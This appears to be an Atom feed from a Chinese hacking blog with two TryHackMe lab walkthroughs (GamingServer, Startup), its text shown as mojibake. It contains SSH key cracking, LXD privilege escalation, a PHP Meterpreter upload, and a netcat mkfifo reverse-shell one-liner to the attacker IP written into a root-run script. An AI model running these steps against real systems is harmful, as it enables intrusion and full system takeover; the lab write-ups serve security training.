<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>PopaywğŸ­</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2024-10-06T08:25:46.255Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>Popayw</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>THM-GamingServer</title>
    <link href="https://www.fomal.cc/posts/91bbca54.html"/>
    <id>https://www.fomal.cc/posts/91bbca54.html</id>
    <published>2024-10-06T05:28:31.000Z</published>
    <updated>2024-10-06T08:25:46.255Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.121.5</p><p>æ”»å‡»æœºipï¼š 10.11.101.220</p></blockquote><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap --min-rate 10000 -sS -sV -sC 10.10.121.5</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142138386-1644378651.png" alt="image-20241006142136365"></p><p>åªå¼€æ”¾äº†22å’Œ80ç«¯å£</p><h2 id="80ç«¯å£æ¢æµ‹"><a href="#80ç«¯å£æ¢æµ‹" class="headerlink" title="80ç«¯å£æ¢æµ‹"></a>80ç«¯å£æ¢æµ‹</h2><p>![image-20241C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241006142532131.png)</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142535295-1944826601.png" alt="image-20241006142533235"></p><p>éå¸¸ç‚«é…·çš„ç•Œé¢</p><p>æµè§ˆä¹‹åå‘ç°åœ¨<code>http://10.10.121.5/about.html#</code> ä¸‹ï¼Œæœ‰ä¸ª<code>upload</code>æŒ‰é’®ï¼Œç‚¹å‡»ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142812327-1270244026.png" alt="image-20241006142810609"></p><p>è¿™æ—¶å€™å‘ç°å°±è·³è½¬åˆ°äº†å¯ä»¥æµè§ˆç›®å½•çš„é¡µé¢</p><h2 id="ä¿¡æ¯åˆ†æ"><a href="#ä¿¡æ¯åˆ†æ" class="headerlink" title="ä¿¡æ¯åˆ†æ"></a>ä¿¡æ¯åˆ†æ</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142836482-132291457.png" alt="image-20241006142835118"></p><p>åœ¨<code>dict.lst</code>ä¸­æ˜¯ä¸€ä¸ªå­—å…¸</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006142914037-561726342.png" alt="image-20241006142912365"></p><p>å°†å…¶ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç•™ç€ä»¥åå¯èƒ½ç”¨å¾—ä¸Š</p><p><code>manifesto.txt</code>å†…å®¹å¦‚ä¸‹ï¼Œæ˜¯ä¸€å°ä¿¡</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006143159087-987491040.png" alt="image-20241006143157410"></p><p>å¾—åˆ°ä¸€ä¸ªç”¨æˆ·å<code>Mentor</code></p><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸€ä¸ªç”¨æˆ·åå’Œä¸€ä¸ªå¯†ç å­—å…¸ï¼Œä¹‹å‰ç«¯å£æ¢æµ‹çš„æ—¶å€™ï¼Œå‘ç°22ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡çˆ†ç ´<code>ssh</code>å¯†ç å°è¯•ç™»å½•</p><h1 id="è·å–æ™®é€šæƒé™"><a href="#è·å–æ™®é€šæƒé™" class="headerlink" title="è·å–æ™®é€šæƒé™"></a>è·å–æ™®é€šæƒé™</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144348962-739972565.png" alt="image-20241006144347297"></p><p>å¾ˆå¯æƒœï¼Œæ²¡æœ‰ç ´è§£æˆåŠŸï¼Œç»§ç»­å°è¯•æ‰«æä¸€ä¸‹ç›®å½•</p><p><code>gobuster dir -u http://10.10.121.5/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006144925900-1562652202.png" alt="image-20241006144924456"></p><p>å‘ç°æœ‰å‡ ä¸ªç‰¹åˆ«çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145023295-181828212.png" alt="image-20241006145021856"></p><p><code>robots.txt</code>é‡Œçš„ä¿¡æ¯å¹¶ä¸å¤ªé‡è¦ï¼Œå› ä¸ºæˆ‘ä»¬ä¹‹å‰ç‚¹å‡»<code>upload</code>è®¿é—®è¿‡è¿™ä¸ªç›®å½•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145111847-955401844.png" alt="image-20241006145110462"></p><p>è¿™ä¸ª<code>/secret</code>ç›®å½•æ˜¯ä¸ªæ–°ç›®å½•ï¼Œä¹‹å‰æ²¡æœ‰æ‰¾åˆ°ï¼ŒæŸ¥çœ‹ä¸€ä¸‹<code>secretKey</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006145149070-1566565554.png" alt="image-20241006145147571"></p><p>å‘ç°è¿™æ˜¯<code>RSA</code>ç§é’¥æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ä¿å­˜ä¸º<code>id_rsa</code>å¹¶èµ‹äºˆ<code>600</code>æƒé™ï¼Œå¯ä»¥çˆ†ç ´åŠ å¯†ç§é’¥çš„å¯†ç </p><p>å…ˆå°†<code>id_rsa</code>è½¬æ¢ä¸ºhashæ ¼å¼</p><p><code>ssh2john id_rsa &gt; rsa_hash</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150305820-1630075297.png" alt="image-20241006150304289"></p><p>ä½¿ç”¨<code>john</code>å¼€å§‹çˆ†ç ´</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p>ä½¿ç”¨<code>john rsa_hash --show</code>æŸ¥çœ‹ç»“æœ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006150549966-1727897226.png" alt="image-20241006150548683"></p><p>æ‰¾åˆ°å¯†ç <code>letmein</code>ï¼Œä½¿ç”¨sshç§é’¥ç™»å½•</p><p><code>ssh Mentor@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151533269-1114822329.png" alt="image-20241006151531886"></p><p>ç™»é™†åè¿˜æ˜¯å¤±è´¥äº†ï¼Œè‚¯å®šæ˜¯ä¹‹å‰æœ‰å“ªäº›ä¿¡æ¯æ²¡æœ‰æ³¨æ„åˆ°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151645250-647968347.png" alt="image-20241006151643801"></p><p>åœ¨é¦–é¡µæºç å¤„å‘ç°å¦ä¸€ä¸ªç”¨æˆ·<code>john</code>ï¼Œä½¿ç”¨è¿™ä¸ªç”¨æˆ·å°è¯•ç™»å½•</p><p><code>ssh john@10.10.121.5 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006151828540-1248866941.png" alt="image-20241006151827027"></p><p>ç™»é™†æˆåŠŸï¼Œçœ‹æ¥ä¹‹å‰çš„é‚£å°ä¿¡åªæ˜¯ä¸€å°ä¿¡è€Œå·²</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153331301-1480645588.png" alt="image-20241006153329663"></p><p>ç›´æ¥åœ¨å½“å‰ç›®å½•æ‰¾åˆ°<code>user.txt</code></p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p><code>sudo -l</code>ç”±äºç¼ºå°‘å¯†ç åˆ©ç”¨ä¸äº†ï¼ŒæŸ¥çœ‹å…¶ä»–å†…å®¹æ—¶ä¹Ÿæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯</p><p>ä½¿ç”¨<code>id</code>æŸ¥çœ‹ä¸€ä¸‹å½“å‰æƒé™</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006153616066-342538492.png" alt="image-20241006153614508"></p><p>å‘ç°å¯ä»¥åˆ©ç”¨<code>lxd</code>ææƒ</p><ul><li>æ”»å‡»æœºå‡†å¤‡</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡gitå°†æ„å»ºå¥½çš„alpineé•œåƒå…‹éš†è‡³æœ¬åœ°ï¼›æ‰§è¡Œâ€œbuild -alpineâ€å‘½ä»¤å®Œæˆæœ€æ–°ç‰ˆæœ¬çš„Alpineé•œåƒæ„å»ºï¼Œæ­¤æ“ä½œå¿…é¡»ç”±rootç”¨æˆ·å®Œæˆ</span><br><span class="line">å°†taræ–‡ä»¶å‘é€è‡³ç›®æ ‡è®¾å¤‡</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span>  https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">./build-alpine</span><br><span class="line">è¿è¡Œå®Œä¸Šè¿°å‘½ä»¤ä¹‹åï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtar.gzæ–‡ä»¶ï¼Œä¹‹åæˆ‘ä»¬éœ€è¦å°†å…¶å‘é€è‡³ç›®æ ‡ç³»ç»Ÿ</span><br><span class="line"></span><br><span class="line">å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†alpineé•œåƒå‘é€è‡³ç›®æ ‡ç³»ç»Ÿçš„/tmpç›®å½•ä¸­</span><br><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160509601-1470459792.png" alt="image-20241006160508143"></p><ul><li>é¶æœºæ“ä½œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://10.11.101.220:8081/apline-v3.10-x86_64-20191008_1227.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160621679-466446020.png" alt="image-20241006160620196"></p><p>é•œåƒæ„å»ºå®Œæˆä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†å…¶ä»¥é•œåƒçš„å½¢å¼æ·»åŠ è¿›LXDäº†</p><p><code>lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage</code></p><p>ä½¿ç”¨<code>lxc image list</code>å‘½ä»¤å³å¯æ£€æŸ¥å¯ç”¨çš„å®¹å™¨åˆ—è¡¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006160943758-117140868.png" alt="image-20241006160942338"></p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lxc init myimage ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161123649-1743013902.png" alt="image-20241006161122252"></p><p>è¿›å…¥å®¹å™¨ä¹‹åï¼Œå®šä½åˆ°<code>/mnt/root</code>å³å¯æŸ¥çœ‹ç›®æ ‡ä¸»æœºè®¾å¤‡çš„æ‰€æœ‰èµ„æºã€‚è¿è¡Œäº†Bashè„šæœ¬ä¹‹åï¼Œæˆ‘ä»¬å°†å¾—åˆ°ä¸€ä¸ªç‰¹æ®Šçš„Shellï¼Œä¹Ÿå°±æ˜¯å®¹å™¨çš„Shellã€‚è¿™ä¸ªå®¹å™¨ä¸­åŒ…å«äº†ç›®æ ‡ä¸»æœºçš„å…¨éƒ¨èµ„æº</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161422968-662607515.png" alt="image-20241006161421526"></p><p>æœ€ååœ¨<code>/mnt/root/root</code>ä¸‹æ‰¾åˆ°<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeç³»åˆ—ä¹‹GamingServer</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Startup</title>
    <link href="https://www.fomal.cc/posts/d57c7ddd.html"/>
    <id>https://www.fomal.cc/posts/d57c7ddd.html</id>
    <published>2024-10-01T11:35:50.000Z</published>
    <updated>2024-10-06T08:25:42.500Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.45.30</p><p>æ”»å‡»æœºipï¼š 10.11.101.220</p></blockquote><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC 10.10.45.30</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 19:41 CST</span><br><span class="line">mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2)</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 10.10.45.30</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]</span><br><span class="line">| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg</span><br><span class="line">|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.11.101.220</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)</span><br><span class="line">|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)</span><br><span class="line">|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Maintenance</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds</span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨21ï¼Œ22ï¼Œ80ç«¯å£ï¼Œå…¶ä¸­21ç«¯å£å¯ä»¥åŒ¿åç™»å½•</p><h2 id="21ç«¯å£æ¢æµ‹"><a href="#21ç«¯å£æ¢æµ‹" class="headerlink" title="21ç«¯å£æ¢æµ‹"></a>21ç«¯å£æ¢æµ‹</h2><p>ç›´æ¥åŒ¿åç™»å½•</p><p><code>ftp anonymous@10.10.45.30</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194636259-1717138662.png" alt="image-20241001194628456"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194933862-1716586471.png" alt="image-20241001194926284"></p><p>å‘ç°å­˜åœ¨ä¸€äº›æ–‡ä»¶å…¨éƒ¨<code>get</code>ä¸‹æ¥ï¼Œå…¶ä¸­<code>ftp</code>ç›®å½•æ˜¯ç©ºçš„</p><h2 id="ftpæ–‡ä»¶åˆ†æ"><a href="#ftpæ–‡ä»¶åˆ†æ" class="headerlink" title="ftpæ–‡ä»¶åˆ†æ"></a>ftpæ–‡ä»¶åˆ†æ</h2><ul><li><code>important.jpg</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195241174-1196545580.png" alt="image-20241001195233137"></p><p>æ²¡å•¥ç”¨</p><ul><li><code>notice.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195329943-334597323.png" alt="image-20241001195322711"></p><p>çœ‹æ ·å­è²Œä¼¼è·Ÿä¸‹è½½æ–‡ä»¶æœ‰å…³ï¼Ÿï¼ˆå¹¶ä¸ç¡®å®šï¼‰</p><h2 id="80ç«¯å£æ¢æµ‹"><a href="#80ç«¯å£æ¢æµ‹" class="headerlink" title="80ç«¯å£æ¢æµ‹"></a>80ç«¯å£æ¢æµ‹</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195527538-1538863478.png" alt="image-20241001195519953"></p><p>é¦–é¡µä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œç›´æ¥æ‰«ç›®å½•</p><p><code>gobuster dir -u http://10.10.45.30/ -w /usr/share/wordlists/dirb/common.txt -z</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200104194-693790804.png" alt="image-20241001200056829"></p><p>å‘ç°å­˜åœ¨<code>/files</code>è·¯ç”±ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200145197-2050816862.png" alt="image-20241001200137927"></p><p>å‘ç°æ˜¯æˆ‘ä»¬é€šè¿‡<code>ftp</code>åŒ¿åç™»å½•è·å¾—çš„å†…å®¹</p><h1 id="è·å–ä¸»æœºæƒé™"><a href="#è·å–ä¸»æœºæƒé™" class="headerlink" title="è·å–ä¸»æœºæƒé™"></a>è·å–ä¸»æœºæƒé™</h1><h2 id="MSFè·å–æ™®é€šæƒé™"><a href="#MSFè·å–æ™®é€šæƒé™" class="headerlink" title="MSFè·å–æ™®é€šæƒé™"></a>MSFè·å–æ™®é€šæƒé™</h2><p>å‘ç°åœ¨<code>ftp</code>ä¸­çš„æ–‡ä»¶å¯ä»¥åœ¨<code>http</code>ä¸­è®¿é—®åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>ftp</code>ä¸Šä¼ æœ¨é©¬ï¼Œé€šè¿‡<code>http</code>æ‰§è¡Œï¼Œä»è€Œè·å¾—æœåŠ¡å™¨çš„æƒé™</p><p>åœ¨ä¹‹å‰æˆ‘ä»¬ä»<code>ftp</code>ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™å‘ç°<code>ftp</code>ç›®å½•æ˜¯å…·æœ‰å¯å†™æƒé™çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±é€šè¿‡è¿™ä¸ªç›®å½•ä¸Šä¼ æ–‡ä»¶</p><p>å…ˆç”Ÿæˆä¸€ä¸ªphpåå¼¹shellçš„æœ¨é©¬</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201240718-6841116.png" alt="image-20241001201232855"></p><p>å°†è¯¥æœ¨é©¬ä¼ åˆ°æœºå™¨çš„ftpç›®å½•ä¸‹ï¼Œæ­¤æ—¶é€šè¿‡httpå¯ä»¥æŸ¥çœ‹åˆ°æ­¤æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201325202-1889182470.png" alt="image-20241001201317928"></p><p>ä½¿ç”¨msfåˆ›å»ºä¸€ä¸ªç›‘å¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# ä½¿ç”¨ exploit/multi/handler æ¨¡å—</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# è®¾ç½®phpçš„æ”»å‡»è´Ÿè½½payload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201533813-1700211541.png" alt="image-20241001201526055"></p><p>å°†å‚æ•°è®¾ç½®å¥½</p><p><code>set LHOST  10.11.101.220</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201702538-1525155851.png" alt="image-20241001201655307"></p><p><code>run</code>å¯åŠ¨</p><p>åœ¨httpä¸Šç‚¹å‡»<code>shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201750120-518358356.png" alt="image-20241001201742671"></p><p>msfå›è¿æˆåŠŸ</p><p>åˆ©ç”¨<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>æ‹¿åˆ°äº¤äº’å¼shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201904169-1947917994.png" alt="image-20241001201856845"></p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241001201949796.png" alt="image-20241001201949796"></p><p>åœ¨<code>/home</code>ç›®å½•ä¸‹å‘ç°<code>lennie</code>ç›®å½•ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®</p><h2 id="Wiresharkæµé‡åˆ†æ"><a href="#Wiresharkæµé‡åˆ†æ" class="headerlink" title="Wiresharkæµé‡åˆ†æ"></a>Wiresharkæµé‡åˆ†æ</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202229662-246877002.png" alt="image-20241001202222169"></p><p>åœ¨æ ¹ç›®å½•å‘ç°ä¸€äº›æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><ul><li><code>recipe.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202335325-965983582.png" alt="image-20241001202328035"></p><p>è¿˜æ˜¯æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯ï¼Œç»§ç»­æŸ¥çœ‹åˆ«çš„å†…å®¹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202451791-1921428504.png" alt="image-20241001202444169"></p><p>åœ¨ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥è®¿é—®çš„<code>incidents</code>æ–‡ä»¶å¤¹ä¸­å‘ç°ä¸€ä¸ªæµé‡åŒ…ï¼Œé€šè¿‡httpå°†å…¶ä¸‹è½½åˆ°æœ¬åœ°</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202957544-1745101645.png" alt="image-20241001202949932"></p><p>å°†æµé‡åŒ…è½¬ç§»è‡³ä¹‹å‰çš„ftpç›®å½•ä¸‹ï¼Œå°±å¯ä»¥é€šè¿‡httpå°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°äº†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001203556445-214800003.png" alt="image-20241001203548668"></p><p>æ‹¿<code>Wireshark</code>åˆ†æ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001204532595-900259921.png" alt="image-20241001204524749"></p><p>åœ¨æµé‡åŒ…é‡Œå‘ç°ç–‘ä¼¼<code>lennie</code>ç”¨æˆ·çš„å¯†ç <code>c4ntg3t3n0ughsp1c3</code>ï¼Œ<code>ssh</code>å°è¯•ç™»é™†ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205517574-1258939451.png" alt="image-20241001205510001"></p><p>ç™»é™†æˆåŠŸ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205657732-1629873569.png" alt="image-20241001205650490"></p><p>åœ¨<code>/home/lennie</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>user.txt</code></p><h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>ç»§ç»­å¯»æ‰¾å…¶ä»–ä¿¡æ¯ï¼Œåœ¨<code>/home/lennie/Documents</code>ä¸‹å‘ç°ä¸€äº›<code>txt</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210158295-521315857.png" alt="image-20241001210151013"></p><p>åœ¨<code>/home/lennie/scripts</code>ä¸‹æ‰¾åˆ°<code>sh</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210347977-2088833048.png" alt="image-20241001210340532"></p><p>æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210321820-713500301.png" alt="image-20241001210314585"></p><p>ç»§ç»­æŸ¥çœ‹ä¸€ä¸‹<code>/etc/print.sh</code>æ–‡ä»¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210437858-314517372.png" alt="image-20241001210430409"></p><p>æˆ‘ä»¬åˆå¯ä»¥å†™å…¥åå¼¹çš„shellåˆ°<code>/etc/print.sh</code>æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡<code>planner.sh</code>è°ƒç”¨æ¥è·å¾—rootæƒé™</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/print.sh</code></p><p>æ‰§è¡Œå°†ä¸Šè¿°å‘½ä»¤</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210720380-89700049.png" alt="image-20241001210713124"></p><p>èµ·ä¸€ä¸ªæ–°çš„ç›‘å¬</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210754289-499424149.png" alt="image-20241001210747046"></p><p>å‡ ä¹æ˜¯ç¬é—´å°±æ¥å—åˆ°äº†åå¼¹çš„shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210940417-178874238.png" alt="image-20241001210932745"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001211024288-765111761.png" alt="image-20241001211016797"></p><p>ç›´æ¥åœ¨å½“å‰ç›®å½•å°±æ‰¾åˆ°äº†<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeç³»åˆ—ä¹‹Startup</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-LazyAdmin</title>
    <link href="https://www.fomal.cc/posts/986850d6.html"/>
    <id>https://www.fomal.cc/posts/986850d6.html</id>
    <published>2024-10-01T05:21:11.000Z</published>
    <updated>2024-10-06T08:25:38.371Z</updated>
    
